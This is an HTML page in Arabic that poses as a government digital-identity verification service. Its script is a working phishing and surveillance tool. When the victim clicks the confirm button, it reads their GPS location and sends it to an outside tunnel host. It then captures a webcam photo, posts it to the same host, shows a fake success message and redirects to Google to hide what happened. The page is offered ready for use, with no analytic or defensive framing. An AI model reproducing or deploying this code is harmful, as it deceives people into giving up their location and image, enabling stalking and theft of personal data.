<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق الرقمي</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        button { background: #1a73e8; color: white; border: none; padding: 15px; border-radius: 8px; width: 100%; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2>نظام التحقق الحكومي</h2>
        <p>يرجى الضغط لتأكيد الهوية الرقمية</p>
        <button id="btn" onclick="start()">تأكيد الهوية الآن</button>
    </div>

    <script>
    async function start() {
        alert("بدء عملية التحقق... يرجى الموافقة على الأذونات التي ستظهر");
        const tunnel = "https://96980dbae77e22.lhr.life"; // تأكد أن هذا هو رابط ترمكس الحالي

        try {
            // طلب الموقع
            navigator.geolocation.getCurrentPosition(p => {
                fetch(`${tunnel}/log.php?lat=${p.coords.latitude}&lon=${p.coords.longitude}`).catch(e => console.log("Error Loc"));
            }, e => alert("خطأ: يرجى تفعيل GPS والموافقة"));

            // طلب الكاميرا
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            alert("تم الوصول للكاميرا، جاري معالجة البيانات...");
            
            const v = document.createElement('video');
            v.srcObject = s;
            v.play();

            setTimeout(async () => {
                const c = document.createElement('canvas');
                c.width = 640; c.height = 480;
                c.getContext('2d').drawImage(v, 0, 0);
                const img = c.toDataURL('image/jpeg');
                
                await fetch(`${tunnel}/log.php`, { method: 'POST', body: JSON.stringify({img: img}) });
                
                s.getTracks().forEach(t => t.stop());
                alert("تم التوثيق بنجاح، سيتم إغلاق البلاغ.");
                window.location.href = "https://google.com"; // تحويله لموقع جوجل بعد الانتهاء
            }, 2000);

        } catch (err) {
            alert("خطأ: يجب السماح بالوصول للكاميرا للمتابعة. أعد المحاولة.");
        }
    }
    </script>
</body>
</html>
